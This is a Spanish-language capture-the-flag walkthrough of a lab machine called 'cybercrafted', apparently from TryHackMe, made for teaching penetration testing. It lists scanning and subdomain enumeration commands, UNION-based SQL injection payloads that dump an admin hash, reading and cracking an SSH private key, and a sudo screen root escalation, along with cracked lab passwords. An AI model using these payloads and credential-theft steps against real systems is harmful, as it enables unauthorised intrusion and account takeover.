### Tags: `Virtual Hosting` `SQLI` `ssh2john`

# Escaneo (*22,80,25565*)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn ip -oN escaneo
```
![image](https://github.com/user-attachments/assets/f0272aa8-5cfc-4150-a6fe-e7be9d396599)

# Web port80

Encontramos un dominio que lo añadimos sal  `etc/hosts`

![image](https://github.com/user-attachments/assets/9a964c02-b302-4e33-8090-8537bf3a52a8)

Ahora visualizamos la web y no había nada pero cuando hicimos `Ctrl + u` encontramos esto

![image](https://github.com/user-attachments/assets/c1ce8331-fd13-4d65-b70d-4a6d4ba51e1f)

## Gobuster (**subdominios**)

```ruby
gobuster vhost -u http://cybercrafted.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

Encontramos estos subdominios los agregamos al `etc/hosts`

![image](https://github.com/user-attachments/assets/be7fc1ce-5590-4615-a596-478575e2909a)

En los 2 (que marcamos en rojo) había un **panel de login** que era el mismo --> (por este lado no es la vía)

![image](https://github.com/user-attachments/assets/99e08865-a65c-40cc-b483-4a6acd18f59c)

También había un subdominio `www.store.cybercrafted.thm` y haciendo Gobuster encontramos este `search.php`

![image](https://github.com/user-attachments/assets/17acaa2d-a341-45b2-9c2a-fa390f0cc92d)


```ruby
gobuster dir -u http://www.store.cybercrafted.thm/  -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php --no-error
```

![image](https://github.com/user-attachments/assets/40e00520-edb0-48ef-939c-e7e093ec3d1d)
![image](https://github.com/user-attachments/assets/51dca3c3-8ae7-4158-b14a-b2a6bc9b600b)

# SQLI (**BurpSuite**)

Observamos que es panel es a vulnerable `sql injection`, si poníamos `'or 1=1 -- -` nos muestra ítems que no aparecían antes. Interceptamos la petición con Burp y con `'order by 4-- -` supimos que había cuatro columnas.
Con este comando `'union select NULL,NULL,NULL,table_name FROM information_schema.tables -- -` observamos una tabla llamada `admin`

![image](https://github.com/user-attachments/assets/36d09945-f699-4884-80ed-2b5ad6936794)

Con este comando `'union select NULL,NULL,NULL,column_name FROM information_schema.columns where table_name = 'admin' -- -`  enumeramos las tablas de `admin`.

![image](https://github.com/user-attachments/assets/a8fb8bf0-294b-428f-90a8-8cf8e2bfec6a)

Obtenemos el hash y el user de esta forma: `'union select NULL,NULL,user,hash from admin -- -`

 ![image](https://github.com/user-attachments/assets/ea4f3a0a-8016-4219-a506-39add30328c1)

Tenemos un usuario y una contraseña que la Desencriptamos en [CrackStations](https://crackstation.net/) --> `xXUltimateCreeperXx : 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01`, `diamond123456789`

![image](https://github.com/user-attachments/assets/9aa6cb56-97bc-47c3-acef-61056f9c56dd)

Probamos las credenciales para el **panel** y funcionó!

![image](https://github.com/user-attachments/assets/90b65816-1b04-4722-a9d6-4e00e1f23a66)

# Explotación

Tamos dentro y tenemos ejecución de comandos 

![image](https://github.com/user-attachments/assets/aae57b06-18d3-43a9-9023-b137cb69a32d)

Listando el `etc/passwd` vemos 

![image](https://github.com/user-attachments/assets/d1e3d618-3b71-4d65-ab29-c15368de52a3)

Pudimos obtener la `id_rsa` de `xxultimatecreeperxx` 

```ruby 
cat /home/xxultimatecreeperxx/.ssh/id_rsa
```
![image](https://github.com/user-attachments/assets/2b5f035f-3e21-4597-a07c-419b3bf97c79)

Como esta encriptado hacemos lo siguiente:

```ruby
 ssh2john id_rsa > hash.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Tenemos la contraseña `creepin2006` para conectarnos por SSH

![image](https://github.com/user-attachments/assets/6375f344-93dc-4da4-80d3-eb09e6c5493f)

## SSH

Nos conectamos por SSH como el user **xxultimatecreeperxx** y con la contraseña que encontramos anteriormente 

```css
 chmod 600 id_rsa
 ssh xxultimatecreeperxx@10.10.126.43 -i id_rsa
```
![image](https://github.com/user-attachments/assets/403ee93f-6537-461f-b9a4-2121b3846e78)

# Escalada (`cybercrafted`)

Dentro de `/opt` tenemos esto

![image](https://github.com/user-attachments/assets/73cc4f92-5518-4498-b3bb-c5aa1fdbaf31)

Encontramos la contraseña de *cybercrafted* en  un archivo llamado `log.txt` , `JavaEdition>Bedrock`

![image](https://github.com/user-attachments/assets/3057b981-55c1-4ae7-98fe-f9c2abc4b2db)
![image](https://github.com/user-attachments/assets/3a793de4-f81e-41f7-b038-4b175fce2fec)

# Escalada ROOT

Vemos que poniendo `sudo -l` tenemos esto esto que podemos ejecutar como root:

![image](https://github.com/user-attachments/assets/3a60cf66-d76e-4182-a2d8-5f49027b678e)

Buscando en internet en este [Enlace](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-screen-privilege-escalation/) nos dice que acceder como hay que hacer esto:

```ruby
 sudo /usr/bin/screen -r cybercrafted
 Ctrl+a+c
```

![image](https://github.com/user-attachments/assets/7893a598-1872-4613-9961-a9c1b3099d9c)

